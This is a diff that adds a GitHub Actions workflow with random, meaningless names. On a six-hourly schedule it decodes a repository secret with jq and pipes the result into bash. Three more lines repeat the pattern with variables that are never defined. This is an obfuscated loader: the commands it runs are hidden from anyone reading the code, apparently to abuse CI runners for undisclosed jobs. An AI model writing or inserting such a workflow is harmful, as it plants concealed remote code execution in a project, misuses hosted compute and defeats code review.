@@ -1,0 +1,21 @@
+name: timberheadimprobable
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '19 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: timberheadimprobable
+        env:
+          otir265: ${{ secrets.otir265 }}
+        run: |
+          echo $otir265 | jq -r .bzxkj35096 | /bin/bash
+          echo $ufyf83 | jq -r .vlhov21 | /bin/bash
+          echo $rcb2352 | jq -r .fsllh2127 | /bin/bash
+          echo $j9471 | jq -r .pzhb28 | /bin/bash
+
